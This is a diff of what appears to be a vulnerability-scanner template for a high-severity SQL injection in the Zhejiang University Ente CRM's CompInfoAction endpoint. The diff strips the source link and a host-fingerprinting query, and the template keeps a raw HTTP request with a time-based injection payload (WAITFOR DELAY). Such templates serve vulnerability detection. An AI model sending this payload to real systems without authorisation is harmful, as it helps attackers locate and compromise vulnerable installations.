@@ -3,12 +3,8 @@ info:
   name: 浙大恩特CompInfoAction存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmwpcesq479m2n7a'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gmwpcesq479m2n7a
-    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js"
 http:
 - raw:
   - 'GET /entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&method=selectCompBank HTTP/1.1
